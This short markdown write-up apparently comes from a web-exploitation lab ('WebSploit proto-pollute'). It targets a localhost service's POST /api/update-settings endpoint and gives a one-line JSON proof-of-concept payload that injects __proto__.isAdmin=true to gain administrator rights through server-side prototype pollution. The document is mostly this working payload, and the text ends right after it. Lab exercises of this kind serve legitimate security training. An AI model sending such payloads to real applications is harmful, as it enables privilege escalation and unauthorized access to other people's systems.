# Prototype Pollution — WebSploit `proto-pollute`

## Target

http://127.0.0.1:5004

## Endpoint

POST /api/update-settings

## Vulnerability

Server-Side Prototype Pollution

## Proof of Concept

```json
{"__proto__":{"isAdmin":true}}
